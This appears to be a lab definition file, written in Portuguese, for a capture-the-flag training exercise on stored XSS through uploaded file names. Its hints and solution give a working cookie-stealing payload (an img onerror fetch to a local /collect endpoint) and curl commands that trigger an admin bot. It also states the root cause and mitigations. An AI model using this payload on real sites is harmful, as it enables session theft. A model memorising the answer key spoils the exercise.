@@ -1,0 +1,80 @@
+{
+  "slug": "upload-filename-xss",
+  "title": "Dê um nome ao seu próprio payload",
+  "codename": "DROPZONE",
+  "summary": "O dock de upload preserva os nomes originais dos arquivos e a galeria os renderiza sem tratamento. Um nome de arquivo contendo um event handler é executado quando o revisor abre a galeria.",
+  "category": "upload",
+  "difficulty": "medium",
+  "lab_dir": "upload-filename-xss",
+  "estimated_minutes": 18,
+  "xp": 210,
+  "tech": [
+    "Flask",
+    "File Upload",
+    "HTML"
+  ],
+  "tags": [
+    "file-upload",
+    "stored-xss",
+    "filename-injection",
+    "admin-bot"
+  ],
+  "story": "O Dropzone mantém o nome original do arquivo para que os usuários encontrem seus assets. A galeria exibe esse nome como HTML para manter o estilo consistente. Um bot revisor abre a galeria com um cookie de sessão legível.",
+  "objective": "Envie um arquivo cujo nome contenha um payload HTML, dispare o bot revisor e capture o cookie de sessão.",
+  "rules": "Fique na origem loopback atribuída. O bot revisor e o collector fazem parte do lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie de sessão do revisor",
+      "flag_type": "user",
+      "points": 210,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "O nome do arquivo é refletido",
+      "body": "Envie qualquer imagem e olhe a galeria. O nome original é impresso sem escape. Nomes de arquivos são conteúdo controlado pelo usuário, assim como campos de formulário.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Transforme um nome em markup",
+      "body": "Use um nome de arquivo como `<img src=x onerror=fetch('/collect?c='+document.cookie)>.png`. A galeria renderiza o nome, e a imagem quebrada dispara o `onerror`.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Dispare o revisor",
+      "body": "Faça `POST` em `/report` para que o revisor abra `/` com `reviewer_session` definido com a flag, e depois leia `/captured`.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "```bash\ncurl -F 'file=@pixel.png;filename=<img src=x onerror=fetch(\"/collect?c=\"+document.cookie)>.png' http://127.0.0.1:PORT/upload\ncurl -X POST http://127.0.0.1:PORT/report\ncurl http://127.0.0.1:PORT/captured\n```\n\nA galeria imprime o nome sem escape, o handler `onerror` roda no navegador do revisor e `/collect` armazena `reviewer_session`.",
+    "root_cause": "O uploader trata o nome original do arquivo como conteúdo de exibição. A galeria interpola o nome armazenado em um sink HTML `<code>` sem encoding, e o uploader mantém o nome multipart original, então os nomes fluem para o HTML sem encoding e o recurso de upload vira um vetor de stored XSS mesmo que apenas os bytes de imagem sejam validados.",
+    "mitigation": "Gere identificadores no servidor para os arquivos armazenados, mantenha o nome original apenas como texto escapado em um text node, valide o tipo de arquivo pelo conteúdo, defina `Content-Disposition: attachment` e sirva downloads a partir de uma origem separada. Use cookies `HttpOnly` e CSP."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — File upload vulnerabilities",
+      "url": "https://portswigger.net/web-security/file-upload",
+      "source_type": "official",
+      "description": "Armadilhas no tratamento de uploads, incluindo confiar no nome do arquivo."
+    },
+    {
+      "title": "OWASP — File Upload Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Nomenclatura, armazenamento e serving seguros de uploads."
+    },
+    {
+      "title": "OWASP — Cross Site Scripting Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Encoding de saída para valores de exibição controlados pelo usuário."
+    }
+  ]
+}
